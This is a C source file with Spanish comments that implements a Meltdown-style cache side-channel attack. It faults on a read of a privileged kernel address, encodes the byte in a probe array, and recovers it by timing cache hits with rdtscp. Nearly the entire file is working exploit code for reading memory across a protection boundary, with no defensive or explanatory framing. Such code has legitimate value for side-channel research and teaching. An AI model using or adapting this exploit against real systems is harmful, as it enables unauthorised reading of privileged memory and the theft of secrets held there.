
#include <stdio.h>
#include <stdint.h>
#include <setjmp.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>

#define CACHE_LIMITE 80
#define PROBE_ARRAY_TAMANO 256 * 4096

// Array que usaremos como canal lateral
uint8_t probe_array[PROBE_ARRAY_TAMANO];
static sigjmp_buf jump_buffer;

// Manejador de fallos de segmentación
void segfault_handler(int sig) {
    siglongjmp(jump_buffer, 1);
}

// Limpia el array de la caché
void flush_cache() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }
    _mm_mfence();
}

// Mide el tiempo de acceso a una dirección de memoria
static inline uint64_t tiempo_de_acceso(volatile uint8_t *addr) {
    unsigned int junk;
    uint64_t start = __rdtscp(&junk);
    (void)*addr;
    uint64_t end = __rdtscp(&junk);
    return end - start;
}

// Función que intenta filtrar un byte desde una dirección dada
int filtrar_byte(uint8_t *target) {
    flush_cache();
    if (sigsetjmp(jump_buffer, 1) == 0) {
        // Acceso ilegal: provoca fallo pero deja rastro en la caché
        uint8_t value = *target;
        probe_array[value * 4096]++;
    }

    // Detección del valor filtrado por análisis de caché
    for (int i = 0; i < 256; i++) {
        uint64_t time = tiempo_de_acceso(&probe_array[i * 4096]);
        if (time < CACHE_LIMITE) {
            return i;
        }
    }

    return -1; // No se logró filtrar nada
}

int main(int argc, char **argv) {
    // Dirección prohibida que intentaremos leer (ajustar si hace falta)
    uint8_t *target = (uint8_t *)(size_t)0xffffffffff600000;

    signal(SIGSEGV, segfault_handler);

    int filtrado;
    while (1) {
        filtrado = filtrar_byte(target);
        if (filtrado != -1) {
            printf("[+] Byte filtrado: %c (0x%02x)\n",
                   (filtrado >= 32 && filtrado <= 126) ? filtrado : '?', filtrado);
            break;
        }
    }

    return 0;
}
